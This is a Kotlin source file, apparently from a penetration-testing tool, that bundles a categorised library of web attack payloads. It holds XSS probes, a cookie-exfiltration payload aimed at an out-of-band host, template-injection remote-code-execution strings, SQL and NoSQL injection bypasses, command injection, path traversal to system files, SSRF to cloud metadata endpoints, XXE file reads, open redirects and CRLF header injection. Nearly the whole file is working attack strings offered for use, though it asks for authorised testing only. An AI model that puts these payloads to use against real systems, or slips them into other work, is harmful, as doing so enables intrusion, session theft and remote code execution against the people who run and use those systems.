package com.authzmatrix.core

/**
 * A bundled, offline arsenal of common web-security test payloads so you don't have to go hunting
 * on GitHub mid-engagement. These are ubiquitous, short probe strings; use only against systems you
 * are authorised to test.
 */
object PayloadLibrary {

    data class Payload(val value: String, val note: String = "")

    /** Ordered categories → payloads. Category keys double as display names. */
    val categories: Map<String, List<Payload>> = linkedMapOf(
        "XSS" to listOf(
            Payload("<script>alert(1)</script>", "Classic reflected/stored probe"),
            Payload("\"><script>alert(1)</script>", "Break out of an attribute"),
            Payload("<img src=x onerror=alert(1)>", "No <script> needed"),
            Payload("<svg onload=alert(1)>", "Short, filter-bypass friendly"),
            Payload("'\"><svg/onload=alert(1)>", "Break out of quotes + tag"),
            Payload("javascript:alert(1)", "href / URL sinks"),
            Payload("<body onload=alert(1)>", "Event-handler based"),
            Payload("<iframe src=javascript:alert(1)>", "iframe JS URI"),
            Payload("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", "Polyglot (many contexts)"),
            Payload("\"><img src=x onerror=this.src='//OOB/'+document.cookie>", "OOB cookie exfil"),
        ),
        "SSTI" to listOf(
            Payload("{{7*7}}", "Jinja2/Twig — renders 49 if vulnerable"),
            Payload("\${7*7}", "FreeMarker / JSP EL / Thymeleaf"),
            Payload("#{7*7}", "Ruby / some template engines"),
            Payload("<%= 7*7 %>", "ERB / EJS"),
            Payload("{{7*'7'}}", "7777777=Jinja2, 49=Twig (engine fingerprint)"),
            Payload("\${{7*7}}", "Smarty / mixed"),
            Payload("@(7*7)", "Razor (.NET)"),
            Payload("{{config}}", "Jinja2 — dump config"),
            Payload("{{''.__class__.__mro__[1].__subclasses__()}}", "Jinja2 — reach RCE gadgets"),
            Payload("\${T(java.lang.Runtime).getRuntime().exec('id')}", "Spring SpEL RCE"),
        ),
        "SQLi" to listOf(
            Payload("' OR '1'='1", "Classic auth bypass"),
            Payload("' OR 1=1-- -", "Comment out the rest"),
            Payload("admin'-- -", "Log in as admin"),
            Payload("\" OR \"\"=\"", "Double-quote variant"),
            Payload("') OR ('1'='1", "Parenthesised context"),
            Payload("' UNION SELECT NULL-- -", "Column-count discovery"),
            Payload("1' AND SLEEP(5)-- -", "MySQL time-based blind"),
            Payload("1;WAITFOR DELAY '0:0:5'-- -", "MSSQL time-based blind"),
            Payload("1) AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -", "Subquery time-based"),
        ),
        "Command injection" to listOf(
            Payload("; id", "Separator (Unix)"),
            Payload("| id", "Pipe"),
            Payload("`id`", "Backtick substitution"),
            Payload("\$(id)", "Command substitution"),
            Payload("& whoami", "Windows/Unix background"),
            Payload("|| ping -c 4 127.0.0.1", "OR chain (Unix)"),
            Payload("& ping -n 4 127.0.0.1", "OR chain (Windows)"),
            Payload("; sleep 5", "Time-based confirm"),
        ),
        "LFI / Path traversal" to listOf(
            Payload("../../../../etc/passwd", "Classic Unix traversal"),
            Payload("..%2f..%2f..%2fetc%2fpasswd", "URL-encoded slashes"),
            Payload("....//....//....//etc/passwd", "Bypass naive ../ stripping"),
            Payload("..\\..\\..\\windows\\win.ini", "Windows traversal"),
            Payload("/etc/passwd", "Absolute path"),
            Payload("php://filter/convert.base64-encode/resource=index.php", "PHP source disclosure"),
            Payload("file:///etc/passwd", "file:// scheme"),
        ),
        "SSRF" to listOf(
            Payload("http://127.0.0.1/", "Loopback"),
            Payload("http://localhost/", "Hostname loopback"),
            Payload("http://[::1]/", "IPv6 loopback"),
            Payload("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
            Payload("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
            Payload("http://127.0.0.1@evil.com/", "Userinfo confusion"),
            Payload("file:///etc/passwd", "Local file via SSRF"),
            Payload("gopher://127.0.0.1:6379/_", "Gopher → internal Redis"),
        ),
        "XXE" to listOf(
            Payload("<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
                "Classic file read"),
            Payload("<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://OOB/\">]><r>&x;</r>",
                "OOB / blind XXE"),
            Payload("<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://OOB/e.dtd\">%p;]>", "External parameter entity"),
        ),
        "NoSQLi" to listOf(
            Payload("{\"\$ne\": null}", "Match anything (Mongo)"),
            Payload("{\"\$gt\": \"\"}", "Greater-than bypass"),
            Payload("admin' || '1'=='1", "JS injection variant"),
            Payload("username[\$ne]=1&password[\$ne]=1", "Query-string operator injection"),
        ),
        "Open redirect" to listOf(
            Payload("//evil.com", "Protocol-relative"),
            Payload("https://evil.com", "Absolute"),
            Payload("/\\evil.com", "Backslash trick"),
            Payload("https:evil.com", "Missing slashes"),
            Payload("http://legit.com.evil.com", "Suffix confusion"),
        ),
        "CRLF injection" to listOf(
            Payload("%0d%0aSet-Cookie:%20test=1", "Inject a header"),
            Payload("%0d%0aLocation:%20https://evil.com", "Redirect via injected header"),
            Payload("%0d%0a%0d%0a<script>alert(1)</script>", "HTTP response splitting → XSS"),
        ),
    )

    val total: Int get() = categories.values.sumOf { it.size }
}
